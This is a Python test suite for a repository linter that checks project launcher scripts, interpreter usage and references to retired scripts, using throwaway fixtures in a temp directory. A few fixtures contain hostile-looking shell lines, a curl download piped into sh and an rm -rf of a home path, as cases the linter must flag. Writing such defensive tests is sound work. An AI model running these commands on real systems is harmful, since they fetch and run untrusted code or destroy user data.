#!/usr/bin/env python3
'Tests for the project-scope extension of three invariants in invariant-check.py.\n\nA project launcher is stricter than the chezmoi named-list rule: shebang must be\nexactly "#!/bin/sh", at most 3 code lines, no control flow (if/then/case/for/while/\nuntil, &&, ||, a function definition, or a $(...)/backtick command substitution), and\nthe last code line starts with "exec ".\n\nEach case builds a throwaway store, points invariant-check at it through\nAGENT_CONTEXT_STORE, and asks the registered Invariant directly. Fixtures are written\nonly inside a temp dir.'

import importlib.util
import os
import shutil
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
CHECK = os.path.join(HERE, "invariant-check.py")

tmp = tempfile.mkdtemp(prefix="invariant-project-scope-test-")
STORE = os.path.join(tmp, "store")
CHEZ = os.path.join(tmp, "chezmoi")
G = os.path.join(STORE, "global")
S = os.path.join(G, "scripts")
H = os.path.join(G, "hooks")
B = os.path.join(CHEZ, "dot_local", "bin")
P = os.path.join(STORE, "projects")
for d in (S, H, B, P):
    os.makedirs(d)
os.environ["AGENT_CONTEXT_STORE"] = STORE
os.environ["AGENT_CONTEXT_CHEZMOI_SOURCE"] = CHEZ

passed = 0
failures = []


def check(label, ok, detail=""):
    global passed
    if ok:
        passed += 1
        print("  PASS " + label)
    else:
        failures.append(label)
        print("  FAIL " + label + ("  -- " + detail if detail else ""))


def write(root, name, text):
    path = os.path.join(root, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)
    os.chmod(path, 0o755)
    return path


def proj_scripts(name):
    return os.path.join(P, name, "scripts")


def proj_hooks(name):
    return os.path.join(P, name, "hooks")


def real(p):
    return os.path.realpath(p)


spec = importlib.util.spec_from_file_location("invariant_check", CHECK)
if spec is None or spec.loader is None:
    sys.exit("cannot load %s" % CHECK)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)


def invariant(ident):
    return next((inv for inv in mod.REGISTRY if inv.id == ident), None)


def site_set(inv):
    return {real(p) for p in inv.sites()}


def violates(inv, path):
    return bool(inv.violated(path, mod._read(path)))


def reported(inv, path):
    found, _ = inv.run()
    return any(real(f["path"]) == real(path) for f in found)


def case(label, fn):
    try:
        ok, detail = fn()
    except Exception as exc:
        check(label, False, "raised %s: %s" % (type(exc).__name__, exc))
        return
    check(label, bool(ok), detail)


shell_inv = invariant("shell-is-launcher-only")
interp_inv = invariant("interpreter-is-rendered")
retired_inv = invariant("no-retired-script-reference")


def need(inv, ident):
    if inv is None:
        return False, "%s is not registered in invariant-check.py" % ident
    return True, ""






logic_script = write(proj_scripts("FixtureProj"), "logic-thing.sh",
                     '#!/bin/sh\nset -eu\nif [ -n "${1:-}" ]; then\n  echo "$1"\nfi\n')
logic_hook = write(proj_hooks("FixtureProj"), "logic-hook.sh",
                   '#!/bin/sh\nif [ -n "${1:-}" ]; then\n  echo hi\nfi\n')
launcher_script = write(proj_scripts("FixtureProj"), "launcher-thing.sh",
                        '#!/bin/sh\nexec python3 "$HOME/.agent-context/global/scripts/launcher-thing.py" "$@"\n')
sweep_shim = write(proj_scripts("FixtureProj"), "wt-sweep.sh",
                   '#!/bin/sh\nexec python3 "$HOME/.agent-context/global/scripts/wt-sweep.py" "$@"\n')
if_block_launcher = write(proj_scripts("FixtureProj"), "if-block.sh",
                          '#!/bin/sh\nif [ -n "$1" ]; then\n  echo "arg"\nfi\n'
                          'exec python3 "$HOME/x.py" "$@"\n')
four_line_launcher = write(proj_scripts("FixtureProj"), "four-line.sh",
                           '#!/bin/sh\nA=1\nB=2\nC=3\nexec python3 "$HOME/x.py" "$@"\n')
bash_one_liner = write(proj_scripts("FixtureProj"), "bash-one-liner.sh",
                       '#!/usr/bin/env bash\nexec python3 "$HOME/x.py" "$@"\n')


command_before_exec = write(proj_scripts("FixtureProj"), "command-before-exec.sh",
                            '#!/bin/sh\nrm -rf "$HOME/x"\nexec python3 "$HOME/x.py" "$@"\n')
pipe_before_exec = write(proj_scripts("FixtureProj"), "pipe-before-exec.sh",
                         '#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n'
                         'exec python3 "$HOME/x.py" "$@"\n')
prefixed_command = write(proj_scripts("FixtureProj"), "prefixed-command.sh",
                         '#!/bin/sh\nA=1 rm -rf "$HOME/x"\nexec python3 "$HOME/x.py" "$@"\n')
assignments_then_exec = write(proj_scripts("FixtureProj"), "assignments-then-exec.sh",
                              '#!/bin/sh\nPYTHONUNBUFFERED=1\nexport TARGET="$HOME/x.py"\n'
                              'exec python3 "$TARGET" "$@"\n')
posix_launcher = write(B, "executable_token-usage-collect",
                       '#!/bin/sh\n# launch the collector\n'
                       'exec python3 "$HOME/.claude/scripts/token-usage-collect.py" "$@"\n')


def case_shell(label, fn):
    ok, detail = need(shell_inv, "shell-is-launcher-only")
    if not ok:
        check(label, False, detail)
        return
    case(label, fn)


case_shell("a project scripts/ .sh is a site",
           lambda: (real(logic_script) in site_set(shell_inv), ""))
case_shell("a project hooks/ .sh is a site",
           lambda: (real(logic_hook) in site_set(shell_inv), ""))
case_shell("a logic-bearing sh under projects/X/scripts is flagged",
           lambda: (reported(shell_inv, logic_script), ""))
case_shell("a hooks/ sh with logic is flagged",
           lambda: (reported(shell_inv, logic_hook), ""))
case_shell("a launcher-only sh under projects/X/scripts is not flagged",
           lambda: (not reported(shell_inv, launcher_script), ""))
case_shell("a one-line python3 exec shim (wt-sweep shape) passes as a launcher",
           lambda: (not reported(shell_inv, sweep_shim), ""))
case_shell("a #!/bin/sh file with an if-block and a trailing exec is flagged",
           lambda: (reported(shell_inv, if_block_launcher), ""))
case_shell("a #!/bin/sh file with 4 plain code lines ending in exec is flagged",
           lambda: (reported(shell_inv, four_line_launcher), ""))
case_shell("a one-line exec launcher under a bash shebang (not POSIX) is flagged",
           lambda: (reported(shell_inv, bash_one_liner), ""))
case_shell("an existing global chezmoi launcher still passes (global scope unchanged)",
           lambda: (not reported(shell_inv, posix_launcher), ""))
case_shell("a #!/bin/sh launcher running a plain command before exec is flagged",
           lambda: (reported(shell_inv, command_before_exec), ""))
case_shell("a #!/bin/sh launcher piping a download into sh before exec is flagged",
           lambda: (reported(shell_inv, pipe_before_exec), ""))
case_shell("an assignment prefixing a command before exec is flagged",
           lambda: (reported(shell_inv, prefixed_command), ""))
case_shell("variable assignments and export before exec pass",
           lambda: (not reported(shell_inv, assignments_then_exec), ""))


def allowlisted_not_flagged():
    assert shell_inv is not None
    key = "FixtureProj/logic-thing.sh"
    shell_inv.allow[key] = "test: exempt to prove the project-qualified allow key"
    try:
        return (not reported(shell_inv, logic_script),
                "still reported after allowlisting with key %r" % key)
    finally:
        del shell_inv.allow[key]


case_shell("the same file allowlisted under its project-qualified key is not flagged",
           allowlisted_not_flagged)


def stale_project_allow():
    assert shell_inv is not None
    stale_launcher = write(proj_scripts("FixtureProj"), "stale-launcher.sh",
                           '#!/bin/sh\nexec python3 "$HOME/.agent-context/global/scripts/stale-launcher.py" "$@"\n')
    key = "FixtureProj/stale-launcher.sh"
    shell_inv.allow[key] = "test: already a real launcher, exemption is dead weight"
    try:
        stale = shell_inv.verify_allow()
    finally:
        del shell_inv.allow[key]
    reason = next((why for base, why in stale if base == key), None)
    return (reason == "no longer violates; exemption is dead weight",
            "verify_allow() returned %r for key %r" % (stale, key))


case_shell("a stale project allowlist entry is caught by --verify", stale_project_allow)






bad_interp = write(proj_scripts("FixtureProj"), "bad-interp.py",
                   "#!/usr/bin/env python3\nimport subprocess\n"
                   "subprocess.run(['python3', 'x.py'])\n")


def case_interp(label, fn):
    ok, detail = need(interp_inv, "interpreter-is-rendered")
    if not ok:
        check(label, False, detail)
        return
    case(label, fn)


case_interp("a project .py is a site",
            lambda: (real(bad_interp) in site_set(interp_inv), ""))
case_interp("a project .py starting a bare python3 command is flagged",
            lambda: (reported(interp_inv, bad_interp), ""))








write(proj_scripts("FixtureProj"), "old-tool.py", "print('ported')\n")
retired_ref = write(proj_hooks("FixtureProj"), "caller.py",
                    "# see old-tool.sh for the old behavior\nx = 1\n")



write(proj_scripts("SecondProj"), "old-tool.sh", "#!/bin/sh\necho live\n")
live_ref = write(proj_hooks("SecondProj"), "caller2.py",
                 "# see old-tool.sh for the old behavior\nx = 1\n")


def case_retired(label, fn):
    ok, detail = need(retired_inv, "no-retired-script-reference")
    if not ok:
        check(label, False, detail)
        return
    case(label, fn)


case_retired("project script/hook files are reference sites",
             lambda: (real(retired_ref) in site_set(retired_inv), ""))
case_retired("a retired project .sh name referenced from a project file is flagged",
             lambda: (reported(retired_inv, retired_ref), ""))
case_retired("a live same-stem name in a different project is not falsely flagged",
             lambda: (not reported(retired_inv, live_ref), ""))


shutil.rmtree(tmp, ignore_errors=True)
print("\ntest-invariant-project-scope: %d passed, %d failed" % (passed, len(failures)))
sys.exit(1 if failures else 0)
